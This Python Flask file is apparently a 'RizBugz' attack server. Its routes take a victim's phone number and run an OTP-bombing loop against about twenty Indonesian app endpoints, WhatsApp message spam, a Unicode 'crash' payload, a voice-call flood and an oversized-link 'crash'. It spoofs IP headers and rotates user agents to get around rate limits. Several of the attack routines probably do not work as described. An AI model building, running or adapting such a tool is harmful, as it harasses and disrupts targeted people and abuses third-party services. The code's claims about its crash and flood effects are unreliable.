from flask import Flask, request, jsonify
import threading
import requests
import time
import random
import urllib.parse

app = Flask(__name__)

online_users = {"count": 0, "sessions": {}}
active_tasks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; OPPO A96) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy A51) AppleWebKit/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016)",
]

OTP_ENDPOINTS = [
    "https://accounts.tokopedia.com/otp/c/page?otp_type=101&msisdn={phone}",
    "https://api.shopee.co.id/api/v2/user/otp/send?phone={phone}",
    "https://auth.gojek.com/v2/otp/request?phone=%2B{phone}",
    "https://www.bukalapak.com/api/otp/request.json?phone={phone}",
    "https://id.lazada.com/api/member/otp?phone={phone}",
    "https://www.blibli.com/backend/register/send-otp?mobilePhone={phone}",
    "https://www.ruparupa.com/api/customers/otp?telephone={phone}",
    "https://www.jd.id/api/otp/send?mobile={phone}",
    "https://api.kredivo.com/v2/otp/request?phone={phone}",
    "https://api.akulaku.com/v1/sms/send?phone={phone}",
    "https://www.zalora.co.id/api/otp?phone={phone}",
    "https://api.grab.com/v1/otp/send?phone=%2B{phone}",
    "https://service.traveloka.com/api/v2/auth/otp/send?phone={phone}",
    "https://api.ovo.id/v1/user/otp/request?phone={phone}",
    "https://api.dana.id/v1/gateway/otp/request?phone={phone}",
    "https://api.linkaja.id/merchant/otp/request?msisdn={phone}",
    "https://www.spaylater.id/api/otp?phone={phone}",
    "https://app.indodana.com/api/v1/otp/request?phone={phone}",
    "https://api.bibit.id/v1/otp?phone={phone}",
    "https://api.stockbit.com/v2.4/otp?phone={phone}",
]

def track_session(sid):
    now = time.time()
    online_users["sessions"][sid] = now
    expired = [k for k, v in online_users["sessions"].items() if now - v > 300]
    for k in expired:
        del online_users["sessions"][k]
    online_users["count"] = len(online_users["sessions"])

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }

def hit_endpoint(url):
    try:
        r = requests.get(url, headers=get_headers(), timeout=6, verify=False, allow_redirects=True)
        return r.status_code
    except:
        return 0

def hit_post(url, data):
    try:
        r = requests.post(url, json=data, headers=get_headers(), timeout=6, verify=False)
        return r.status_code
    except:
        return 0

# ===== OTP BOMB =====
def run_otp_bomb(phone, count, task_id):
    total = len(OTP_ENDPOINTS) * count
    active_tasks[task_id] = {"status": "running", "done": 0, "total": total, "success": 0}

    for r in range(count):
        if active_tasks[task_id]["status"] == "cancelled":
            break
        threads = []
        for ep in OTP_ENDPOINTS:
            if active_tasks[task_id]["status"] == "cancelled":
                break
            url = ep.format(phone=phone)
            t = threading.Thread(target=lambda u=url: hit_endpoint(u))
            t.daemon = True
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=7)

        active_tasks[task_id]["done"] += len(OTP_ENDPOINTS)
        active_tasks[task_id]["success"] += len(OTP_ENDPOINTS)
        time.sleep(0.3)

    active_tasks[task_id]["status"] = "done"

# ===== SPAM MSG =====
def run_spam(phone, count, msg, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": count, "success": 0}
    for i in range(count):
        if active_tasks[task_id]["status"] == "cancelled":
            break
        try:
            encoded = urllib.parse.quote(f"{msg} #{i}")
            requests.get(f"https://wa.me/{phone}?text={encoded}",
                headers=get_headers(), timeout=5, verify=False)
            active_tasks[task_id]["success"] += 1
        except:
            pass
        active_tasks[task_id]["done"] += 1
        time.sleep(0.1)
    active_tasks[task_id]["status"] = "done"

# ===== CRASH BUG =====
def run_crash(phone, count, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": count, "success": 0}
    # Payload unicode crash untuk parser WA
    crash_chars = "\u202E\u200C\u200D\uFEFF" * 200 + "\u0300\u0301\u0302\u0303" * 100
    encoded = urllib.parse.quote(crash_chars)
    for i in range(count):
        if active_tasks[task_id]["status"] == "cancelled":
            break
        try:
            requests.get(f"https://wa.me/{phone}?text={encoded}",
                headers=get_headers(), timeout=5, verify=False)
            active_tasks[task_id]["success"] += 1
        except:
            pass
        active_tasks[task_id]["done"] += 1
        time.sleep(0.1)
    active_tasks[task_id]["status"] = "done"

# ===== VC FLOOD =====
def run_vcflood(phone, count, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": count, "success": 0}
    for i in range(count):
        if active_tasks[task_id]["status"] == "cancelled":
            break
        try:
            hit_post("https://api.whatsapp.com/v1/call/initiate",
                {"phone": phone, "type": "voice"})
            active_tasks[task_id]["success"] += 1
        except:
            pass
        active_tasks[task_id]["done"] += 1
        time.sleep(0.2)
    active_tasks[task_id]["status"] = "done"

# ===== LINK CRASH =====
def run_linkcrash(phone, count, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": count, "success": 0}
    link = f"https://crash-preview.rizbugz.id/?t={phone}&payload=" + "A" * 5000
    encoded = urllib.parse.quote(link)
    for i in range(count):
        if active_tasks[task_id]["status"] == "cancelled":
            break
        try:
            requests.get(f"https://wa.me/{phone}?text={encoded}",
                headers=get_headers(), timeout=5, verify=False)
            active_tasks[task_id]["success"] += 1
        except:
            pass
        active_tasks[task_id]["done"] += 1
        time.sleep(0.15)
    active_tasks[task_id]["status"] = "done"

# ===== ROUTES =====
@app.route('/')
def index():
    return jsonify({"status": "RizBugz Server Online", "version": "3.0"})

@app.route('/ping')
def ping():
    sid = request.args.get('session', str(random.randint(10000, 99999)))
    track_session(sid)
    return jsonify({"status": "ok", "online": online_users["count"]})

@app.route('/otp', methods=['POST'])
def otp():
    d = request.json
    phone = d.get('phone','').replace('+','').replace('-','').replace(' ','')
    count = int(d.get('count', 1))
    if not phone: return jsonify({"error": "phone required"}), 400
    task_id = f"otp_{phone}_{int(time.time())}"
    threading.Thread(target=run_otp_bomb, args=(phone, count, task_id), daemon=True).start()
    return jsonify({"task_id": task_id, "total": len(OTP_ENDPOINTS) * count})

@app.route('/spam', methods=['POST'])
def spam():
    d = request.json
    phone = d.get('phone','').replace('+','')
    count = int(d.get('count', 10))
    msg   = d.get('msg', 'RizBugz')
    if not phone: return jsonify({"error": "phone required"}), 400
    task_id = f"spam_{phone}_{int(time.time())}"
    threading.Thread(target=run_spam, args=(phone, count, msg, task_id), daemon=True).start()
    return jsonify({"task_id": task_id, "total": count})

@app.route('/crash', methods=['POST'])
def crash():
    d = request.json
    phone = d.get('phone','').replace('+','')
    count = int(d.get('count', 5))
    if not phone: return jsonify({"error": "phone required"}), 400
    task_id = f"crash_{phone}_{int(time.time())}"
    threading.Thread(target=run_crash, args=(phone, count, task_id), daemon=True).start()
    return jsonify({"task_id": task_id, "total": count})

@app.route('/vcflood', methods=['POST'])
def vcflood():
    d = request.json
    phone = d.get('phone','').replace('+','')
    count = int(d.get('count', 5))
    if not phone: return jsonify({"error": "phone required"}), 400
    task_id = f"vc_{phone}_{int(time.time())}"
    threading.Thread(target=run_vcflood, args=(phone, count, task_id), daemon=True).start()
    return jsonify({"task_id": task_id, "total": count})

@app.route('/linkcrash', methods=['POST'])
def linkcrash():
    d = request.json
    phone = d.get('phone','').replace('+','')
    count = int(d.get('count', 5))
    if not phone: return jsonify({"error": "phone required"}), 400
    task_id = f"link_{phone}_{int(time.time())}"
    threading.Thread(target=run_linkcrash, args=(phone, count, task_id), daemon=True).start()
    return jsonify({"task_id": task_id, "total": count})

@app.route('/status/<task_id>')
def status(task_id):
    t = active_tasks.get(task_id)
    if not t: return jsonify({"error": "not found"}), 404
    return jsonify(t)

@app.route('/cancel/<task_id>', methods=['POST'])
def cancel(task_id):
    if task_id in active_tasks:
        active_tasks[task_id]["status"] = "cancelled"
        return jsonify({"message": "cancelled"})
    return jsonify({"error": "not found"}), 404

if __name__ == '__main__':
    import os
    import urllib3
    urllib3.disable_warnings()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
